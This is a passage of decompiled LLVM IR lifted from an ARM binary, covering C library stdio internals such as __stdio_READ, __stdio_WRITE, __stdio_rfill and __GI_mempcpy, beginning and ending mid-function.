  %v2_176c4 = load i32, i32* @r5, align 4
  %v3_176c4 = add i32 %v2_176c4, 16
  %v4_176c4 = inttoptr i32 %v3_176c4 to i16*
  store i16 %v1_176c4, i16* %v4_176c4, align 2
  %v0_176c8 = load i32, i32* @r7, align 4
  %v1_176c8 = add i32 %v0_176c8, 18
  %v2_176c8 = inttoptr i32 %v1_176c8 to i8*
  %v3_176c8 = load i8, i8* %v2_176c8, align 1
  %v4_176c8 = zext i8 %v3_176c8 to i32
  store i32 %v4_176c8, i32* @r3, align 4
  %v2_176cc = load i32, i32* @r5, align 4
  %v3_176cc = add i32 %v2_176cc, 18
  %v4_176cc = inttoptr i32 %v3_176cc to i8*
  store i8 %v3_176c8, i8* %v4_176cc, align 1
  %v0_176d0 = call i32 @memcpy()
  %v0_176d4 = load i32, i32* @r7, align 4
  %v1_176d4 = add i32 %v0_176d4, 16
  %v2_176d4 = inttoptr i32 %v1_176d4 to i16*
  %v3_176d4 = load i16, i16* %v2_176d4, align 2
  %v4_176d4 = zext i16 %v3_176d4 to i32
  %v0_176d8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_176d8, i32* @r5, align 4
  %v2_176dc = add i32 %v4_176d4, %v0_176d4
  store i32 %v2_176dc, i32* @r7, align 4
  br label %dec_label_pc_176e0

dec_label_pc_176e0:                               ; preds = %dec_label_pc_17630, %dec_label_pc_176ac
  %v0_176b8 = phi i32 [ %tmp, %dec_label_pc_17630 ], [ %v0_176d8, %dec_label_pc_176ac ]
  %v0_176b0 = phi i32 [ %v1_175e4, %dec_label_pc_17630 ], [ %v2_176dc, %dec_label_pc_176ac ]
  %v3_176e4 = icmp ult i32 %v0_176b0, %v2_17630
  %v1_176e8 = add i32 %v0_176b8, 19
  store i32 %v1_176e8, i32* @r0, align 4
  %v1_176ec = add i32 %v0_176b0, 19
  store i32 %v1_176ec, i32* @r1, align 4
  br i1 %v3_176e4, label %dec_label_pc_17650, label %dec_label_pc_176f4.loopexit

dec_label_pc_176f4.loopexit:                      ; preds = %dec_label_pc_176e0
  %v0_176f4.pre = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_176f4

dec_label_pc_176f4:                               ; preds = %dec_label_pc_176f4.loopexit, %dec_label_pc_17670
  %v1_176f4 = phi i32 [ %v0_176b8, %dec_label_pc_176f4.loopexit ], [ %v0_17688, %dec_label_pc_17670 ]
  %v0_176f4 = phi i32 [ %v0_176f4.pre, %dec_label_pc_176f4.loopexit ], [ %v1_17688, %dec_label_pc_17670 ]
  %v2_176f4 = sub i32 %v1_176f4, %v0_176f4
  store i32 %v2_176f4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_176f8

dec_label_pc_176f8:                               ; preds = %dec_label_pc_17628, %dec_label_pc_17690, %dec_label_pc_1760c, %dec_label_pc_176f4
  %v0_176f8 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v6_175cc, i32* @r5, align 4
  store i32 %v12_175cc, i32* @r7, align 4
  ret i32 %v0_176f8

; uselistorder directives
  uselistorder i32 %v0_176b0, { 5, 6, 4, 2, 3, 0, 1 }
  uselistorder i32 %v0_176b8, { 0, 4, 1, 2, 3 }
  uselistorder i32 %v1_175e4, { 1, 2, 0 }
  uselistorder i32 %tmp, { 0, 1, 3, 2, 4 }
  uselistorder i32* %sl.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 6, 1, 2, 3, 4, 5, 7, 0 }
  uselistorder i32 19, { 9, 10, 0, 3, 11, 4, 12, 13, 5, 6, 7, 8, 1, 14, 2, 15 }
  uselistorder i32 18, { 9, 10, 8, 0, 1, 2, 3, 11, 4, 12, 5, 13, 6, 14, 7, 15 }
  uselistorder i32 22, { 1, 0, 10, 2, 3, 4, 5, 6, 11, 12, 7, 13, 8, 14, 9, 15 }
  uselistorder i32* @sp, { 2, 3, 0, 4, 1 }
  uselistorder i32 -8, { 38, 17, 18, 19, 20, 21, 22, 16, 15, 10, 14, 13, 12, 11, 23, 24, 25, 26, 27, 9, 40, 28, 29, 30, 31, 32, 39, 41, 33, 42, 37, 34, 35, 36, 8, 0, 1, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 %arg1, { 2, 1, 3, 0, 4 }
  uselistorder label %dec_label_pc_176f8, { 3, 1, 0, 2 }
  uselistorder label %dec_label_pc_176e0, { 1, 0 }
}

define i32 @__stdio_READ(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17710 = load i32, i32* @r4, align 4
  store i32 %v3_17710, i32* %stack_var_-12, align 4
  %v0_17714 = load i32, i32* %r0.global-to-local, align 4
  %v1_17714 = inttoptr i32 %v0_17714 to i16*
  %v2_17714 = load i16, i16* %v1_17714, align 2
  %v3_17714 = zext i16 %v2_17714 to i32
  store i32 %v3_17714, i32* @r3, align 4
  %v1_17718 = and i32 %v3_17714, 4
  store i32 %v1_17718, i32* @r5, align 4
  %v2_17718 = icmp eq i32 %v1_17718, 0
  store i32 %v0_17714, i32* @r4, align 4
  br i1 %v2_17718, label %dec_label_pc_1772c, label %bb

bb:                                               ; preds = %entry
  store i32 0, i32* %r0.global-to-local, align 4
  br label %.thread7

dec_label_pc_1772c:                               ; preds = %entry
  %v1_1772c = icmp slt i32 %arg2, 0
  br i1 %v1_1772c, label %bb18, label %bb19

bb18:                                             ; preds = %dec_label_pc_1772c
  store i32 2147483647, i32* @r2, align 4
  br label %bb19

bb19:                                             ; preds = %dec_label_pc_1772c, %bb18
  %v1_17734 = add i32 %v0_17714, 4
  %v2_17734 = inttoptr i32 %v1_17734 to i32*
  %v3_17734 = load i32, i32* %v2_17734, align 4
  store i32 %v3_17734, i32* %r0.global-to-local, align 4
  %v1_17738 = call i32 @__libc_read(i32 %v3_17734)
  store i32 %v1_17738, i32* %r0.global-to-local, align 4
  %v5_17740 = icmp sgt i32 %v1_17738, 0
  br i1 %v5_17740, label %.thread7, label %dec_label_pc_17744

dec_label_pc_17744:                               ; preds = %bb19
  %v2_1773c = icmp eq i32 %v1_17738, 0
  %v0_17744 = load i32, i32* @r4, align 4
  %v1_17744 = inttoptr i32 %v0_17744 to i16*
  %v2_17744 = load i16, i16* %v1_17744, align 2
  br i1 %v2_1773c, label %bb20, label %bb21

bb20:                                             ; preds = %dec_label_pc_17744
  %v2_17748 = or i16 %v2_17744, 4
  store i16 %v2_17748, i16* %v1_17744, align 2
  %v1_17764.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread7

bb21:                                             ; preds = %dec_label_pc_17744
  %v2_1774c = or i16 %v2_17744, 8
  store i16 %v2_1774c, i16* %v1_17744, align 2
  %v1_17758 = load i32, i32* @r5, align 4
  store i32 %v1_17758, i32* %r0.global-to-local, align 4
  br label %.thread7

.thread7:                                         ; preds = %bb20, %bb, %bb19, %bb21
  %v1_17764 = phi i32 [ %v1_17764.pre, %bb20 ], [ 0, %bb ], [ %v1_17738, %bb19 ], [ %v1_17758, %bb21 ]
  %v2_17760 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_17760, i32* @r4, align 4
  ret i32 %v1_17764

; uselistorder directives
  uselistorder i16 %v2_17744, { 1, 0 }
  uselistorder i32 %v1_17738, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 2, 5, 6, 3, 4, 0, 1 }
  uselistorder i32 (i32)* @__libc_read, { 4, 2, 3, 0, 1 }
  uselistorder label %.thread7, { 3, 0, 2, 1 }
  uselistorder label %bb19, { 1, 0 }
}

define i32 @__stdio_WRITE(i16* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %arg3, i32* @r7, align 4
  store i32 %tmp, i32* @r4, align 4
  store i32 %arg2, i32* @r6, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 2147483647, i32* @r8, align 4
  %v2_1782c2 = icmp eq i32 %arg3, 0
  store i1 %v2_1782c2, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1782c2, label %dec_label_pc_17834, label %dec_label_pc_17784

dec_label_pc_17784:                               ; preds = %entry, %dec_label_pc_1782cthread-pre-split.dec_label_pc_17784_crit_edge
  %v0_17790 = phi i32 [ %v0_17790.pre, %dec_label_pc_1782cthread-pre-split.dec_label_pc_17784_crit_edge ], [ %tmp, %entry ]
  %v0_1778c = phi i32 [ %v5_1779c, %dec_label_pc_1782cthread-pre-split.dec_label_pc_17784_crit_edge ], [ %arg2, %entry ]
  %v3_17784 = phi i32 [ %v3_17784.pre, %dec_label_pc_1782cthread-pre-split.dec_label_pc_17784_crit_edge ], [ 2147483647, %entry ]
  %v0_17788.in = phi i32 [ %v5_177a0, %dec_label_pc_1782cthread-pre-split.dec_label_pc_17784_crit_edge ], [ %arg3, %entry ]
  %v3_17788 = phi i32 [ %v5_177a0, %dec_label_pc_1782cthread-pre-split.dec_label_pc_17784_crit_edge ], [ %arg3, %entry ]
  %v0_17788 = icmp slt i32 %v0_17788.in, 0
  %storemerge = select i1 %v0_17788, i32 %v3_17784, i32 %v3_17788
  store i32 %storemerge, i32* @r2, align 4
  store i32 %v0_1778c, i32* %r1.global-to-local, align 4
  %v1_17790 = add i32 %v0_17790, 4
  %v2_17790 = inttoptr i32 %v1_17790 to i32*
  %v3_17790 = load i32, i32* %v2_17790, align 4
  %v3_17794 = call i32 @__GI___libc_write(i32 %v3_17790, i32 %v0_1778c)
  %v1_17798 = icmp slt i32 %v3_17794, 0
  %v2_17798 = icmp eq i32 %v3_17794, 0
  store i1 %v2_17798, i1* %cpsr_z.global-to-local, align 1
  br i1 %v1_17798, label %dec_label_pc_177a8, label %dec_label_pc_1782cthread-pre-split

dec_label_pc_177a8:                               ; preds = %dec_label_pc_17784
  %v0_177a8 = load i32, i32* @r4, align 4
  %v1_177a8 = inttoptr i32 %v0_177a8 to i16*
  %v2_177a8 = load i16, i16* %v1_177a8, align 2
  %v1_177ac = or i16 %v2_177a8, 8
  store i16 %v1_177ac, i16* %v1_177a8, align 2
  store i32 40748, i32* %r3.global-to-local, align 4
  %v0_177b8 = call i32 @__aeabi_read_tp()
  %v3_177bc = load i16, i16* @global_var_216f0.341, align 2
  %v4_177bc = sext i16 %v3_177bc to i32
  store i32 %v4_177bc, i32* %r3.global-to-local, align 4
  %v2_177c0 = add i32 %v4_177bc, %v0_177b8
  %v3_177c0 = inttoptr i32 %v2_177c0 to i32*
  %v4_177c0 = load i32, i32* %v3_177c0, align 4
  store i32 %v4_177c0, i32* %r3.global-to-local, align 4
  %v7_177c4 = icmp eq i32 %v4_177c0, 4
  store i1 %v7_177c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_177c4, label %dec_label_pc_177d0, label %bb21

bb21:                                             ; preds = %dec_label_pc_177a8
  %v8_177c8 = icmp eq i32 %v4_177c0, 11
  store i1 %v8_177c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_177c8, label %dec_label_pc_177d0, label %dec_label_pc_17834

dec_label_pc_177d0:                               ; preds = %dec_label_pc_177a8, %bb21
  %v0_177d0 = load i32, i32* @r4, align 4
  %v1_177d0 = add i32 %v0_177d0, 8
  store i32 %v1_177d0, i32* %r2.global-to-local, align 4
  %v1_177d4 = inttoptr i32 %v1_177d0 to i32*
  %v2_177d4 = load i32, i32* %v1_177d4, align 4
  store i32 %v2_177d4, i32* %r2.global-to-local, align 4
  %v3_177d4 = add i32 %v0_177d0, 12
  %v4_177d4 = inttoptr i32 %v3_177d4 to i32*
  %v5_177d4 = load i32, i32* %v4_177d4, align 4
  store i32 %v5_177d4, i32* %r3.global-to-local, align 4
  %v2_177d8 = sub i32 %v5_177d4, %v2_177d4
  store i32 %v2_177d8, i32* %r1.global-to-local, align 4
  %v9_177d8 = icmp eq i32 %v5_177d4, %v2_177d4
  store i1 %v9_177d8, i1* %cpsr_z.global-to-local, align 1
  %v0_17824.pre = load i32, i32* @r5, align 4
  br i1 %v9_177d8, label %dec_label_pc_17824, label %dec_label_pc_177e0

dec_label_pc_177e0:                               ; preds = %dec_label_pc_177d0
  %v3_177e0 = icmp ult i32 %v2_177d8, %v0_17824.pre
  %v9_177e0 = icmp eq i32 %v2_177d8, %v0_17824.pre
  store i1 %v9_177e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_177e0, label %.preheader, label %bb22

bb22:                                             ; preds = %dec_label_pc_177e0
  store i32 %v0_17824.pre, i32* %r1.global-to-local, align 4
  br label %.preheader

.preheader:                                       ; preds = %dec_label_pc_177e0, %bb22, %dec_label_pc_17808
  %v2_177f4 = phi i32 [ %v1_1780c, %dec_label_pc_17808 ], [ %v2_177d4, %bb22 ], [ %v2_177d4, %dec_label_pc_177e0 ]
  %v0_177e8 = load i32, i32* @r6, align 4
  %v1_177e8 = inttoptr i32 %v0_177e8 to i8*
  %v2_177e8 = load i8, i8* %v1_177e8, align 1
  %v3_177e8 = zext i8 %v2_177e8 to i32
  store i32 %v3_177e8, i32* %r3.global-to-local, align 4
  %v7_177ec = icmp eq i8 %v2_177e8, 10
  store i1 %v7_177ec, i1* %cpsr_z.global-to-local, align 1
  %v1_177f0 = add i32 %v0_177e8, 1
  store i32 %v1_177f0, i32* @r6, align 4
  %v3_177f4 = inttoptr i32 %v2_177f4 to i8*
  store i8 %v2_177e8, i8* %v3_177f4, align 1
  %v0_177f8 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_177f8, label %dec_label_pc_177fc, label %dec_label_pc_17808

dec_label_pc_177fc:                               ; preds = %.preheader
  %v0_177fc = load i32, i32* @r4, align 4
  %v1_177fc = inttoptr i32 %v0_177fc to i16*
  %v2_177fc = load i16, i16* %v1_177fc, align 2
  %v3_177fc = zext i16 %v2_177fc to i32
  store i32 %v3_177fc, i32* %r3.global-to-local, align 4
  %v1_17800 = and i32 %v3_177fc, 256
  %v2_17800 = icmp eq i32 %v1_17800, 0
  store i1 %v2_17800, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17800, label %dec_label_pc_17808, label %dec_label_pc_177fc.dec_label_pc_17814_crit_edge

dec_label_pc_177fc.dec_label_pc_17814_crit_edge:  ; preds = %dec_label_pc_177fc
  %v0_17818.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_17814

dec_label_pc_17808:                               ; preds = %dec_label_pc_177fc, %.preheader
  %v0_17808 = load i32, i32* %r1.global-to-local, align 4
  %v1_17808 = add i32 %v0_17808, -1
  store i32 %v1_17808, i32* %r1.global-to-local, align 4
  %v7_17808 = icmp eq i32 %v0_17808, 1
  store i1 %v7_17808, i1* %cpsr_z.global-to-local, align 1
  %v0_1780c = load i32, i32* %r2.global-to-local, align 4
  %v1_1780c = add i32 %v0_1780c, 1
  store i32 %v1_1780c, i32* %r2.global-to-local, align 4
  br i1 %v7_17808, label %dec_label_pc_17808.dec_label_pc_17814_crit_edge, label %.preheader

dec_label_pc_17808.dec_label_pc_17814_crit_edge:  ; preds = %dec_label_pc_17808
  %v0_17814.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17814

dec_label_pc_17814:                               ; preds = %dec_label_pc_177fc.dec_label_pc_17814_crit_edge, %dec_label_pc_17808.dec_label_pc_17814_crit_edge
  %v0_17818 = phi i32 [ %v1_1780c, %dec_label_pc_17808.dec_label_pc_17814_crit_edge ], [ %v0_17818.pre, %dec_label_pc_177fc.dec_label_pc_17814_crit_edge ]
  %v0_17814 = phi i32 [ %v0_17814.pre, %dec_label_pc_17808.dec_label_pc_17814_crit_edge ], [ %v0_177fc, %dec_label_pc_177fc.dec_label_pc_17814_crit_edge ]
  %v1_17814 = add i32 %v0_17814, 8
  %v2_17814 = inttoptr i32 %v1_17814 to i32*
  %v3_17814 = load i32, i32* %v2_17814, align 4
  store i32 %v3_17814, i32* %r3.global-to-local, align 4
  %v2_17818 = add i32 %v0_17814, 16
  %v3_17818 = inttoptr i32 %v2_17818 to i32*
  store i32 %v0_17818, i32* %v3_17818, align 4
  %v0_1781c = load i32, i32* %r3.global-to-local, align 4
  %v1_1781c = load i32, i32* %r2.global-to-local, align 4
  %v2_1781c = sub i32 %v1_1781c, %v0_1781c
  store i32 %v2_1781c, i32* %r3.global-to-local, align 4
  %v1_17820 = load i32, i32* @r5, align 4
  %v2_17820 = sub i32 %v1_17820, %v2_1781c
  br label %dec_label_pc_17824

dec_label_pc_17824:                               ; preds = %dec_label_pc_177d0, %dec_label_pc_17814
  %v0_17824 = phi i32 [ %v2_17820, %dec_label_pc_17814 ], [ %v0_17824.pre, %dec_label_pc_177d0 ]
  %v1_17824 = load i32, i32* @r7, align 4
  %v2_17824 = sub i32 %v1_17824, %v0_17824
  store i32 %v2_17824, i32* @r7, align 4
  br label %dec_label_pc_17834

dec_label_pc_1782cthread-pre-split:               ; preds = %dec_label_pc_17784
  %v3_1779c = load i32, i32* @r6, align 4
  %v5_1779c = add i32 %v3_1779c, %v3_17794
  store i32 %v5_1779c, i32* @r6, align 4
  %v4_177a0 = load i32, i32* @r5, align 4
  %v5_177a0 = sub i32 %v4_177a0, %v3_17794
  store i32 %v5_177a0, i32* @r5, align 4
  %v2_1782c = icmp eq i32 %v5_177a0, 0
  store i1 %v2_1782c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1782c, label %dec_label_pc_17834, label %dec_label_pc_1782cthread-pre-split.dec_label_pc_17784_crit_edge

dec_label_pc_1782cthread-pre-split.dec_label_pc_17784_crit_edge: ; preds = %dec_label_pc_1782cthread-pre-split
  %v3_17784.pre = load i32, i32* @r8, align 4
  %v0_17790.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_17784

dec_label_pc_17834:                               ; preds = %dec_label_pc_1782cthread-pre-split, %entry, %bb21, %dec_label_pc_17824
  %v0_17834 = load i32, i32* @r7, align 4
  ret i32 %v0_17834

; uselistorder directives
  uselistorder i32 %v5_177a0, { 1, 3, 0, 2 }
  uselistorder i32 %v5_1779c, { 1, 0 }
  uselistorder i32 %v0_17814, { 1, 0 }
  uselistorder i32 %v1_1780c, { 0, 2, 1 }
  uselistorder i32 %v0_17808, { 1, 0 }
  uselistorder i32 %v0_17824.pre, { 0, 3, 1, 2 }
  uselistorder i32 %v5_177d4, { 1, 0, 2 }
  uselistorder i32 %v2_177d4, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_17794, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1778c, { 1, 0 }
  uselistorder i32* %r2.global-to-local, { 2, 1, 3, 4, 5, 6, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 3, 2, 4, 5, 0 }
  uselistorder i1* %cpsr_z.global-to-local, { 10, 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8 10, { 2, 3, 0, 1 }
  uselistorder i32 11, { 8, 5, 6, 7, 15, 22, 23, 9, 10, 11, 2, 12, 13, 14, 16, 17, 3, 18, 4, 19, 0, 20, 1, 21, 24 }
  uselistorder i32 (i32, i32)* @__GI___libc_write, { 2, 1, 0 }
  uselistorder i32 2147483647, { 1, 6, 7, 0, 2, 3, 4, 5 }
  uselistorder i32 %arg3, { 1, 0, 2, 3, 4, 5 }
  uselistorder label %dec_label_pc_17834, { 0, 3, 2, 1 }
  uselistorder label %dec_label_pc_17824, { 1, 0 }
  uselistorder label %dec_label_pc_17814, { 1, 0 }
  uselistorder label %.preheader, { 2, 1, 0 }
  uselistorder label %dec_label_pc_177d0, { 1, 0 }
  uselistorder label %dec_label_pc_17784, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_17844 = load i32, i32* @r4, align 4
  store i32 %v3_17844, i32* %stack_var_-8, align 4
  %v1_17848 = add i32 %arg1, 8
  %v1_1784c = inttoptr i32 %v1_17848 to i32*
  %v2_1784c = load i32, i32* %v1_1784c, align 4
  store i32 %v2_1784c, i32* @r1, align 4
  %v3_1784c = add i32 %arg1, 12
  %v4_1784c = inttoptr i32 %v3_1784c to i32*
  %v5_1784c = load i32, i32* %v4_1784c, align 4
  %v2_17850 = sub i32 %v5_1784c, %v2_1784c
  store i32 %v2_17850, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* @r4, align 4
  %v3_17858 = inttoptr i32 %arg1 to i16*
  %v4_17858 = call i32 @__stdio_READ(i16* %v3_17858, i32 %v2_1784c, i32 %v2_17850)
  %v0_1785c = load i32, i32* @r4, align 4
  %v1_1785c = add i32 %v0_1785c, 8
  %v2_1785c = inttoptr i32 %v1_1785c to i32*
  %v3_1785c = load i32, i32* %v2_1785c, align 4
  store i32 %v3_1785c, i32* %r2.global-to-local, align 4
  %v2_17860 = add i32 %v3_1785c, %v4_17858
  %v2_17864 = add i32 %v0_1785c, 20
  %v3_17864 = inttoptr i32 %v2_17864 to i32*
  store i32 %v2_17860, i32* %v3_17864, align 4
  %v0_17868 = load i32, i32* %r2.global-to-local, align 4
  %v1_17868 = load i32, i32* @r4, align 4
  %v2_17868 = add i32 %v1_17868, 16
  %v3_17868 = inttoptr i32 %v2_17868 to i32*
  store i32 %v0_17868, i32* %v3_17868, align 4
  %v2_1786c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_1786c, i32* @r4, align 4
  ret i32 %v4_17858

; uselistorder directives
  uselistorder i32 %v4_17858, { 1, 0 }
  uselistorder i32 %arg1, { 3, 2, 1, 0 }
}

define i32 @__stdio_trans2r_o() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_17874 = load i32, i32* @r4, align 4
  store i32 %v3_17874, i32* %stack_var_-12, align 4
  %v0_17878 = load i32, i32* @r0, align 4
  %v1_17878 = inttoptr i32 %v0_17878 to i16*
  %v2_17878 = load i16, i16* %v1_17878, align 2
  %v3_17878 = zext i16 %v2_17878 to i32
  store i32 %v3_17878, i32* %r3.global-to-local, align 4
  %v0_1787c = load i32, i32* @r1, align 4
  %v2_1787c = and i32 %v0_1787c, %v3_17878
  %v4_1787c = icmp eq i32 %v2_1787c, 0
  store i32 %v0_17878, i32* @r4, align 4
  br i1 %v4_1787c, label %dec_label_pc_1788c, label %dec_label_pc_1789c

dec_label_pc_1788c:                               ; preds = %entry
  %v1_1788c = and i32 %v3_17878, 2176
  %v2_1788c = icmp eq i32 %v1_1788c, 0
  br i1 %v2_1788c, label %dec_label_pc_17894, label %dec_label_pc_178a8

dec_label_pc_17894:                               ; preds = %dec_label_pc_1788c
  %v2_17894 = or i32 %v0_1787c, %v3_17878
  store i32 %v2_17894, i32* %r3.global-to-local, align 4
  %v1_17898 = trunc i32 %v2_17894 to i16
  store i16 %v1_17898, i16* %v1_17878, align 2
  %v0_1789c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_1789c

dec_label_pc_1789c:                               ; preds = %entry, %dec_label_pc_17894
  %v0_1789c = phi i32 [ %v0_17878, %entry ], [ %v0_1789c.pre, %dec_label_pc_17894 ]
  %v1_1789c = inttoptr i32 %v0_1789c to i16*
  %v2_1789c = load i16, i16* %v1_1789c, align 2
  %v3_1789c = zext i16 %v2_1789c to i32
  store i32 %v3_1789c, i32* %r3.global-to-local, align 4
  %v1_178a0 = and i32 %v3_1789c, 16
  store i32 %v1_178a0, i32* %r5.global-to-local, align 4
  %v2_178a0 = icmp eq i32 %v1_178a0, 0
  br i1 %v2_178a0, label %dec_label_pc_178d0, label %dec_label_pc_178a8

dec_label_pc_178a8:                               ; preds = %dec_label_pc_1788c, %dec_label_pc_1789c
  store i32 40504, i32* %r3.global-to-local, align 4
  %v0_178ac = call i32 @__aeabi_read_tp()
  store i32 %v0_178ac, i32* %r0.global-to-local, align 4
  %v3_178b0 = load i16, i16* @global_var_216f0.341, align 2
  %v4_178b0 = sext i16 %v3_178b0 to i32
  store i32 %v4_178b0, i32* %r3.global-to-local, align 4
  %v3_178b8 = add i32 %v4_178b0, %v0_178ac
  %v4_178b8 = inttoptr i32 %v3_178b8 to i32*
  store i32 9, i32* %v4_178b8, align 4
  br label %dec_label_pc_178bc

dec_label_pc_178bc:                               ; preds = %dec_label_pc_178d8, %dec_label_pc_178a8
  %v0_178bc = load i32, i32* @r4, align 4
  %v1_178bc = inttoptr i32 %v0_178bc to i16*
  %v2_178bc = load i16, i16* %v1_178bc, align 2
  %v3_178bc = zext i16 %v2_178bc to i32
  store i32 -1, i32* %r0.global-to-local, align 4
  %v1_178c4 = or i32 %v3_178bc, 8
  store i32 %v1_178c4, i32* %r3.global-to-local, align 4
  %v1_178c8 = trunc i32 %v1_178c4 to i16
  store i16 %v1_178c8, i16* %v1_178bc, align 2
  %v1_17910.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17908

dec_label_pc_178d0:                               ; preds = %dec_label_pc_1789c
  %v1_178d0 = and i32 %v3_1789c, 64
  %v2_178d0 = icmp eq i32 %v1_178d0, 0
  br i1 %v2_178d0, label %dec_label_pc_178f8, label %dec_label_pc_178d8

dec_label_pc_178d8:                               ; preds = %dec_label_pc_178d0
  %v0_178d8 = load i32, i32* @r0, align 4
  %v1_178d8 = call i32 @__stdio_wcommit(i32 %v0_178d8)
  store i32 %v1_178d8, i32* %r0.global-to-local, align 4
  %v2_178dc = icmp eq i32 %v1_178d8, 0
  br i1 %v2_178dc, label %dec_label_pc_178e4, label %dec_label_pc_178bc

dec_label_pc_178e4:                               ; preds = %dec_label_pc_178d8
  %v0_178e4 = load i32, i32* @r4, align 4
  %v1_178e4 = inttoptr i32 %v0_178e4 to i16*
  %v2_178e4 = load i16, i16* %v1_178e4, align 2
  %v3_178e4 = zext i16 %v2_178e4 to i32
  store i32 %v3_178e4, i32* %r3.global-to-local, align 4
  %v1_178e8 = add i32 %v0_178e4, 8
  %v2_178e8 = inttoptr i32 %v1_178e8 to i32*
  %v3_178e8 = load i32, i32* %v2_178e8, align 4
  %v1_178ec = and i32 %v3_178e4, 65471
  store i32 %v1_178ec, i32* %r3.global-to-local, align 4
  %v2_178f0 = add i32 %v0_178e4, 28
  %v3_178f0 = inttoptr i32 %v2_178f0 to i32*
  store i32 %v3_178e8, i32* %v3_178f0, align 4
  %v0_178f4 = load i32, i32* %r3.global-to-local, align 4
  %v1_178f4 = trunc i32 %v0_178f4 to i16
  %v2_178f4 = load i32, i32* @r4, align 4
  %v3_178f4 = inttoptr i32 %v2_178f4 to i16*
  store i16 %v1_178f4, i16* %v3_178f4, align 2
  %v0_178f8.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_178f8

dec_label_pc_178f8:                               ; preds = %dec_label_pc_178d0, %dec_label_pc_178e4
  %v2_17900 = phi i32 [ %v0_1789c, %dec_label_pc_178d0 ], [ %v0_178f8.pre, %dec_label_pc_178e4 ]
  %v1_178f8 = inttoptr i32 %v2_17900 to i16*
  %v2_178f8 = load i16, i16* %v1_178f8, align 2
  %v3_178f8 = zext i16 %v2_178f8 to i32
  %v1_178fc = or i32 %v3_178f8, 1
  store i32 %v1_178fc, i32* %r3.global-to-local, align 4
  %v1_17900 = trunc i32 %v1_178fc to i16
  store i16 %v1_17900, i16* %v1_178f8, align 2
  %v0_17904 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_17904, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_17908

dec_label_pc_17908:                               ; preds = %dec_label_pc_178bc, %dec_label_pc_178f8
  %v1_17910 = phi i32 [ %v1_17910.pre, %dec_label_pc_178bc ], [ %v0_17904, %dec_label_pc_178f8 ]
  %v2_1790c = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_1790c, i32* @r4, align 4
  ret i32 %v1_17910

; uselistorder directives
  uselistorder i32 %v3_17878, { 0, 2, 1, 3 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4 }
  uselistorder i32 65471, { 2, 1, 0 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 2, 1, 0 }
  uselistorder label %dec_label_pc_17908, { 1, 0 }
  uselistorder label %dec_label_pc_178f8, { 1, 0 }
  uselistorder label %dec_label_pc_178a8, { 1, 0 }
  uselistorder label %dec_label_pc_1789c, { 1, 0 }
}

define i32 @__GI_mempcpy(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r0, align 4
  %v3_17918 = load i32, i32* @r4, align 4
  %v6_17918 = load i32, i32* @r5, align 4
  store i32 %arg1, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %v0_17928 = call i32 @memcpy()
  %v0_1792c = load i32, i32* @r5, align 4
  %v1_1792c = load i32, i32* @r4, align 4
  %v2_1792c = add i32 %v1_1792c, %v0_1792c
  store i32 %v3_17918, i32* @r4, align 4
  store i32 %v6_17918, i32* @r5, align 4
  ret i32 %v2_1792c
}

define i32 @__sigjmp_save() local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_1793c = load i32, i32* @r1, align 4
  %v2_1793c = icmp eq i32 %v0_1793c, 0
  %v3_17940 = load i32, i32* @r4, align 4
